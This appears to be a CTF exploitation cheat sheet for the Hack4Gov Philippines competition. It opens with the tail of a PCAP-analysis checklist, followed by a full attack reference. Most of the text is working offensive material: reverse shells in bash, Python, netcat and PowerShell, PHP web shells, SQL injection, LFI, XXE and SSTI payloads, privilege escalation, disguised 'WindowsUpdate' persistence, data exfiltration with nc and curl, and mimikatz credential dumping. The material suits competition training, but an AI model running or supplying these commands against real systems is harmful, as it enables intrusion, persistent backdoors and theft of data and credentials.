### CTF Checklist

- [ ] Run strings and grep for flag formats
- [ ] Check protocol hierarchy
- [ ] Export all objects (HTTP, SMB, etc.)
- [ ] Follow all TCP streams
- [ ] Check DNS queries for exfiltration
- [ ] Analyze ICMP for covert channels
- [ ] Look for encoded/encrypted data
- [ ] Check packet timing patterns
- [ ] Extract and analyze files
- [ ] Check for steganography in protocols
- [ ] Verify SSL/TLS certificates
- [ ] Look for non-standard ports
- [ ] Check user agents and headers
- [ ] Analyze authentication attempts
- [ ] Search for SQL/command injection
- [ ] Check for beaconing behavior
- [ ] Look for data exfiltration
- [ ] Analyze any wireless protocols
- [ ] Check USB/HID for keyloggers
- [ ] Review any custom protocols

---

## Conclusion

This comprehensive guide covers the essential techniques for PCAP analysis in CTF competitions. Remember:

1. **Always start simple** - strings, grep, and basic filters often find flags quickly
2. **Think creatively** - flags can be hidden in timing, headers, or protocol abuse
3. **Use multiple tools** - each tool has strengths for different scenarios
4. **Document findings** - keep notes of what you've tried
5. **Consider context** - especially for themed CTFs like Hack4Gov

For Philippines Hack4Gov specifically:

- [Inference] Expect scenarios related to government security
- [Inference] Look for Filipino language elements
- [Inference] Consider local network infrastructure patterns
- [Inference] Check for compliance and regulatory themes

Keep this guide handy during competitions and adapt techniques based on the specific challenge requirements. Happy hunting!

---

# Machine Exploitation

## 📋 Table of Contents
1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Network Enumeration](#network-enumeration)
3. [Service Exploitation](#service-exploitation)
4. [Web Application Attacks](#web-application-attacks)
5. [Privilege Escalation](#privilege-escalation)
6. [Post-Exploitation](#post-exploitation)
7. [Common CTF Patterns](#common-ctf-patterns)
8. [Tool Reference](#tool-reference)

---

## 🔍 Initial Reconnaissance

### Network Scanning
```bash
# Quick TCP scan
nmap -sC -sV -oA initial <IP>

# Full TCP scan
nmap -p- -T4 <IP>

# UDP scan (top 1000)
nmap -sU --top-ports 1000 <IP>

# Aggressive scan with scripts
nmap -A -p- --script vuln <IP>

# Stealth scan
nmap -sS -T2 -f -Pn <IP>
```

### Service Version Detection
```bash
# Banner grabbing
nc -nv <IP> <PORT>
telnet <IP> <PORT>

# Specific service probing
nmap -sV -p<PORT> --version-intensity 9 <IP>
```

### Subdomain Enumeration
```bash
# DNS enumeration
dnsrecon -d <domain> -t std
dnsenum <domain>
gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host discovery
gobuster vhost -u http://<IP> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## 🌐 Network Enumeration

### SMB (139/445)
```bash
# Enumeration
enum4linux -a <IP>
smbclient -L //<IP>/ -N
smbmap -H <IP>
crackmapexec smb <IP> -u '' -p ''

# Access shares
smbclient //<IP>/<SHARE> -U <username>

# Mount share
mount -t cifs //<IP>/<SHARE> /mnt/smb -o username=<user>

# Vulnerability scanning
nmap -p445 --script smb-vuln* <IP>
```

### FTP (21)
```bash
# Anonymous login
ftp <IP>
> anonymous
> anonymous

# Enumeration
nmap -sV -p21 --script ftp-* <IP>

# Download all files
wget -r ftp://anonymous:anonymous@<IP>
```

### SSH (22)
```bash
# User enumeration
python ssh_user_enum.py -u users.txt <IP>

# Brute force
hydra -L users.txt -P passwords.txt ssh://<IP>

# SSH key permissions fix
chmod 600 id_rsa
ssh -i id_rsa user@<IP>
```

### HTTP/HTTPS (80/443)
```bash
# Directory enumeration
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
feroxbuster -u http://<IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt

# Technology detection
whatweb <IP>
wappalyzer http://<IP>

# Nikto scan
nikto -h http://<IP>
```

### MySQL (3306)
```bash
# Connection attempts
mysql -h <IP> -u root
mysql -h <IP> -u root -p

# Enumeration
nmap -p3306 --script mysql-* <IP>
```

### RDP (3389)
```bash
# Connection
xfreerdp /v:<IP> /u:<username> /p:<password>
rdesktop <IP>

# Brute force
hydra -L users.txt -P passwords.txt rdp://<IP>
```

---

## 💥 Service Exploitation

### Web Shells
```bash
# PHP reverse shell (pentestmonkey)
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'"); ?>

# Upload locations to check
/var/www/html/uploads/
/tmp/
/var/tmp/
/dev/shm/
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/sh <IP> <PORT>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Stabilization
```bash
# Python TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Full TTY upgrade
# In reverse shell:
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
# In local terminal:
stty raw -echo; fg
# In reverse shell:
export TERM=xterm
export SHELL=bash
stty rows <num> cols <num>
```

### Metasploit Quick Wins
```bash
# Search exploits
searchsploit <service> <version>

# Common modules
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms08_067_netapi
use exploit/multi/http/tomcat_mgr_upload
use exploit/linux/http/apache_mod_cgi_bash_env_exec

# Meterpreter upgrade
use post/multi/manage/shell_to_meterpreter
```

---

## 🌐 Web Application Attacks

### SQL Injection
```sql
# Basic tests
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin' --
admin' #

# Union-based
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' UNION SELECT database(),user(),version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

# SQLMap automation
sqlmap -u "http://<IP>/page.php?id=1" --dbs
sqlmap -u "http://<IP>/page.php?id=1" -D <db> --tables
sqlmap -u "http://<IP>/page.php?id=1" -D <db> -T <table> --dump
sqlmap -r request.txt --level=5 --risk=3
```

### Command Injection
```bash
# Common payloads
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# Bypass filters
l""s
l''s
l\s
/bin/cat /etc/passwd
```

### Local File Inclusion (LFI)
```bash
# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input (POST data: <?php system('id'); ?>)
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/mail.log
/proc/self/environ
```

### XSS Payloads
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'-alert(1)-'
```

### XXE Injection
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>

# Out-of-band
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://<YOUR_IP>/xxe.dtd">
%remote;
]>
```

### SSTI (Server-Side Template Injection)
```python
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}

# Exploitation (Flask/Jinja2)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].popen('id').read()}}
```

---

## ⬆️ Privilege Escalation

### Linux Enumeration
```bash
# System info
uname -a
cat /etc/issue
cat /proc/version
hostname

# User info
id
whoami
groups
sudo -l
cat /etc/passwd
cat /etc/shadow

# SUID/SGID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Services
ps aux
ps -ef
netstat -tulpn
ss -tulpn

# Automated enumeration
./linpeas.sh
./linenum.sh
./linux-smart-enumeration.sh
```

### Windows Enumeration
```powershell
# System info
systeminfo
hostname
net users
net user <username>
whoami /priv

# Search for passwords
findstr /si password *.txt *.xml *.ini
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Services
sc query
wmic service list brief
Get-Service

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Installed software
wmic product get name,version
Get-WmiObject -Class Win32_Product

# Automated enumeration
.\winPEAS.exe
.\PowerUp.ps1
.\Sherlock.ps1
```

### Common Privilege Escalation Vectors

#### Linux
```bash
# Sudo misconfiguration
sudo -l
# Look for: (ALL) NOPASSWD: /path/to/binary

# SUID exploitation
./gtfobins.github.io

# Kernel exploits
searchsploit linux kernel <version>
# Common: DirtyCow, PwnKit

# Cron job hijacking
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > /path/to/script.sh

# Path hijacking
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/hijacked_binary
chmod +x /tmp/hijacked_binary

# Capabilities
getcap -r / 2>/dev/null
# Exploit with: /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Windows
```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Token impersonation
# Use JuicyPotato, RoguePotato, PrintSpoofer

# SAM/SYSTEM extraction
reg save hklm\sam sam.hive
reg save hklm\system system.hive
# Crack with: samdump2, mimikatz
```

---

## 📦 Post-Exploitation

### Persistence
```bash
# Linux
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" | crontab -
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> ~/.bashrc

# Windows
schtasks /create /sc minute /mo 1 /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle Hidden -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://<IP>/shell.ps1\")'"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "C:\path\to\backdoor.exe"
```

### Data Exfiltration
```bash
# Linux
tar czf - /path/to/data | nc <IP> <PORT>
curl -X POST -F "file=@/path/to/file" http://<IP>/upload

# Windows
certutil -urlcache -f http://<IP>/nc.exe nc.exe
powershell -c "(New-Object Net.WebClient).UploadFile('http://<IP>/upload', 'C:\path\to\file')"
```

### Credential Harvesting
```bash
# Linux
cat /etc/shadow
grep -r "password" /var/www/
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Windows
mimikatz.exe
sekurlsa::logonpasswords
lsadump::sam
hashdump (meterpreter)
```

---

## 🎯 Common CTF Patterns

### Flag Formats
```
flag{...}
FLAG{...}
HTB{...}
ctf{...}
ph{...}
hack4gov{...}
```

### Common Flag Locations
```bash
# Linux
/root/flag.txt
/home/*/flag.txt
/var/www/html/flag.txt
/opt/flag.txt
/tmp/flag.txt

# Windows
C:\Users\Administrator\Desktop\flag.txt
C:\flag.txt
C:\Windows\System32\config\flag.txt

# Database
SELECT * FROM flags;
SELECT * FROM users WHERE username='admin';
```

### Steganography
```bash
# Image analysis
strings image.jpg
exiftool image.jpg
binwalk -e image.png
steghide extract -sf image.jpg
stegsolve.jar

# File carving
foremost -i file.dd
scalpel file.dd
```

### Cryptography
```bash
# Hash identification
hash-identifier
hashid hash.txt

# Hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# Common modes:
# 0 - MD5
# 100 - SHA1
# 1400 - SHA256
# 1800 - SHA512
# 3200 - bcrypt
# 13100 - Kerberos TGS
```

---

## 🛠️ Tool Reference

### Essential Tools
| Tool | Purpose | Usage |
|------|---------|-------|
| nmap | Network scanning | `nmap -sC -sV <IP>` |
| gobuster | Directory brute-forcing | `gobuster dir -u http://<IP> -w wordlist.txt` |
| sqlmap | SQL injection | `sqlmap -u "http://<IP>/page?id=1" --dbs` |
| hydra | Password brute-forcing | `hydra -L users.txt -P pass.txt ssh://<IP>` |
| metasploit | Exploitation framework | `msfconsole` |
| burpsuite | Web proxy | GUI application |
| john | Password cracking | `john --wordlist=rockyou.txt hash.txt` |
| linpeas | Linux privesc enumeration | `./linpeas.sh` |
| winpeas | Windows privesc enumeration | `.\winPEAS.exe` |
| netcat | Network utility | `nc -lvnp <PORT>` |

### Wordlists
```bash
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/SecLists/
/usr/share/wordlists/dirbuster/
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/
```

### Quick Commands Reference
```bash
# Start listeners
nc -lvnp 4444
python3 -m http.server 8000
python2 -m SimpleHTTPServer 8000
impacket-smbserver share . -smb2support

# File transfers
# Linux to Linux
scp file.txt user@<IP>:/tmp/
wget http://<IP>/file
curl http://<IP>/file -o file

# Windows downloads
certutil -urlcache -f http://<IP>/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe', 'file.exe')"
Invoke-WebRequest -Uri http://<IP>/file -OutFile file

# Base64 encoding/decoding
echo -n "text" | base64
echo "dGV4dA==" | base64 -d

# URL encoding/decoding
echo -n "text" | xxd -plain | sed 's/\(..\)/%\1/g'
python3 -c "import urllib.parse; print(urllib.parse.quote('text'))"
```

---

## 📚 Methodology Checklist

### Initial Access
- [ ] Port scan (all 65535 ports)
- [ ] Service enumeration
- [ ] Web directory brute-forcing
- [ ] Default credentials check
- [ ] Public exploits search
- [ ] Web vulnerability scanning

### Foothold
- [ ] Upload web shell
- [ ] Exploit vulnerable service
- [ ] SQL injection to RCE
- [ ] Command injection
- [ ] File inclusion to RCE

### Privilege Escalation
- [ ] SUID/SGID binaries
- [ ] Sudo misconfigurations
- [ ] Kernel exploits
- [ ] Cron job hijacking
- [ ] Service exploitation
- [ ] Password hunting

### Flag Capture
- [ ] Check common locations
- [ ] Search for *.txt files
- [ ] Database enumeration
- [ ] Check user directories
- [ ] Environment variables
- [ ] Running processes

---

## 🔗 Resources

### Online Resources
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- PayloadAllTheThings: GitHub repository
- HackTricks: https://book.hacktricks.xyz/
- PentestMonkey: Reverse shells cheatsheet
- CyberChef: Online encoding/decoding

### Practice Platforms
- TryHackMe
- HackTheBox
- OverTheWire
- PicoCTF
- VulnHub

---

## ⚠️ Important Notes

1. **Always verify your target IP** before attacking
2. **Stay within scope** - only attack designated CTF machines
3. **Document everything** - keep notes of successful exploits
4. **Time management** - don't get stuck on one challenge too long
5. **Team coordination** - communicate findings with teammates
6. **Backup shells** - always establish multiple access points
7. **Clean up** - remove artifacts after competition (if required)

Remember: In CTF competitions, persistence and methodical enumeration often win over complex exploits. Start with the basics and escalate complexity as needed.

Good luck at Hack4Gov PH! 🇵🇭